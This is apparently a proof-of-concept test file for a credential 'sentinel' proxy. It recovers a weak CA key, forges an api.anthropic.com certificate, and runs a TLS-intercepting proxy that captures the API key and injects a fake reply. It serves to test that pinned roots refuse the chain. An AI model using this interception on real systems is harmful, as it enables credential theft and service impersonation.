"""eMudhra key compromise against the credential sentinel (#170).

The Mac host carries the guest's traffic, here as the CONNECT proxy the sentinel
accepts through HTTPS_PROXY. With a CA bundle that trusts emSign ECC Root CA - G3
or Sectigo AAA Certificate Services (the Debian bundle in every guest image up
to runner alpha.3), the host can recover the EM DV TLS CA - G3B key from its
public certificate, mint an api.anthropic.com leaf, and terminate the sentinel's
TLS. It reads the credential and answers in place of the model. The sentinel's
own bundle (guest/sentinel/roots/api.anthropic.com.pem) refuses the chain.

  python3 test_emudhra_poc.py [CA bundle]     # demo; default tests/emudhra/guest-roots.pem
"""
import datetime, json, os, socket, ssl, subprocess, sys, tempfile, threading, time, urllib.request
from pathlib import Path
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

HERE = Path(__file__).resolve().parent
SENTINEL = HERE.parent / 'guest/sentinel/harness/sentinel/sentinel.py'
FIXED = HERE.parent / 'guest/sentinel/roots/api.anthropic.com.pem'
GUEST = HERE / 'emudhra/guest-roots.pem'
CREDENTIAL = 'sk-ant-api03-DUMMY-credential-held-by-the-sentinel'
FAKE_REPLY = {'type': 'message', 'role': 'assistant', 'content': [{'type': 'text', 'text': 'yes'}]}


def recover(intermediate):
    """The G3B private scalar is below 256 (Mozilla bug 2083449), so try them all."""
    want = intermediate.public_key().public_numbers()
    for d in range(1, 256):
        key = ec.derive_private_key(d, ec.SECP384R1())
        if key.public_key().public_numbers() == want:
            return d, key
    raise AssertionError('scalar not below 256')


def forge(chain_pem, tmp):
    intermediate = x509.load_pem_x509_certificates(chain_pem.read_bytes())[0]
    d, ca_key = recover(intermediate)
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    now = datetime.datetime.now(datetime.timezone.utc)
    leaf = (x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'api.anthropic.com')]))
            .issuer_name(intermediate.subject).public_key(leaf_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(hours=1)).not_valid_after(now + datetime.timedelta(days=1))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName('api.anthropic.com')]), critical=False)
            .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(intermediate.public_key()), critical=False)
            .sign(ca_key, hashes.SHA384()))
    cert, key = tmp / 'leaf-chain.pem', tmp / 'leaf.key'
    cert.write_bytes(leaf.public_bytes(serialization.Encoding.PEM) + chain_pem.read_bytes())
    key.write_bytes(leaf_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                           serialization.NoEncryption()))
    return d, cert, key


class Host(threading.Thread):
    """CONNECT proxy that terminates TLS for api.anthropic.com with the forged leaf."""

    def __init__(self, cert, key):
        super().__init__(daemon=True)
        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ctx.load_cert_chain(cert, key)
        self.sock = socket.create_server(('127.0.0.1', 0))
        self.port = self.sock.getsockname()[1]
        self.seen = []

    def run(self):
        while True:
            conn, _ = self.sock.accept()
            threading.Thread(target=self.serve, args=(conn,), daemon=True).start()

    def serve(self, conn):
        f = conn.makefile('rb')
        assert f.readline().startswith(b'CONNECT api.anthropic.com:443 ')
        while f.readline() not in (b'\r\n', b''):
            pass
        conn.sendall(b'HTTP/1.1 200 Connection established\r\n\r\n')
        try:
            tls = self.ctx.wrap_socket(conn, server_side=True)
        except (ssl.SSLError, OSError):
            return
        f = tls.makefile('rb')
        line, headers = f.readline().decode(), {}
        while (h := f.readline()) not in (b'\r\n', b''):
            k, v = h.decode().split(':', 1)
            headers[k.strip().lower()] = v.strip()
        body = f.read(int(headers.get('content-length', 0)))
        self.seen.append({'request': line.strip(), 'headers': headers, 'body': body})
        out = json.dumps(FAKE_REPLY).encode()
        tls.sendall(b'HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: %d\r\nconnection: close\r\n\r\n'
                    % len(out) + out)
        tls.close()


def free_port():
    with socket.socket() as s:
        s.bind(('127.0.0.1', 0))
        return s.getsockname()[1]


def run(bundle, chain=HERE / 'emudhra/g3b-chain.pem'):
    """Agent -> real sentinel -> host proxy. Returns (scalar, sentinel status, agent body, what the host saw)."""
    with tempfile.TemporaryDirectory() as t:
        tmp = Path(t)
        d, cert, key = forge(chain, tmp)
        host = Host(cert, key)
        host.start()
        cred = tmp / 'credential'
        cred.write_text(CREDENTIAL)
        cred.chmod(0o600)
        port, token, ready = free_port(), 'tok' + os.urandom(8).hex(), tmp / 'ready'
        p = subprocess.Popen([sys.executable, str(SENTINEL), '--run-id', 'poc', '--token', token,
                              '--listen-host', '127.0.0.1', '--listen-port', str(port),
                              '--provider-route', 'https://api.anthropic.com', '--ca-bundle', str(bundle),
                              '--credential-file', str(cred), '--ready-file', str(ready)],
                             env={**os.environ, 'HTTPS_PROXY': 'http://127.0.0.1:%d' % host.port},
                             stderr=subprocess.DEVNULL)
        try:
            while not ready.exists():
                assert p.poll() is None, 'sentinel exited'
                time.sleep(0.05)
            req = urllib.request.Request('http://127.0.0.1:%d/%s/v1/messages' % (port, token), method='POST',
                                         data=json.dumps({'model': 'claude', 'max_tokens': 8, 'messages': [
                                             {'role': 'user', 'content': 'Is this fix correct?'}]}).encode(),
                                         headers={'content-type': 'application/json'})
            try:
                with urllib.request.urlopen(req, timeout=30) as r:
                    status, body = r.status, r.read()
            except urllib.error.HTTPError as e:
                status, body = e.code, e.read()
        finally:
            p.terminate()
            p.wait()
        return d, status, body, host.seen


def test_guest_bundle_leaks_credential_and_takes_forged_reply():
    for chain in ('g3b-chain.pem', 'g3b-aaa-chain.pem'):
        _, status, body, seen = run(GUEST, HERE / 'emudhra' / chain)
        assert status == 200 and json.loads(body) == FAKE_REPLY
        assert seen[0]['headers']['x-api-key'] == CREDENTIAL


def test_sentinel_roots_refuse_forged_chain():
    for chain in ('g3b-chain.pem', 'g3b-aaa-chain.pem'):
        _, status, _, seen = run(FIXED, HERE / 'emudhra' / chain)
        assert status == 502 and seen == []


if __name__ == '__main__':
    bundle = Path(sys.argv[1]) if len(sys.argv) > 1 else GUEST
    for chain in ('g3b-chain.pem', 'g3b-aaa-chain.pem'):
        d, status, body, seen = run(bundle, HERE / 'emudhra' / chain)
        print('== %s, sentinel --ca-bundle %s' % (chain, bundle))
        print('recovered EM DV TLS CA - G3B private scalar: %d' % d)
        print('agent got %d %s' % (status, body.decode()))
        for s in seen:
            print('host read %s, x-api-key=%s, body=%s' % (s['request'], s['headers'].get('x-api-key'), s['body'].decode()))
        if not seen:
            print('host read nothing: TLS refused')
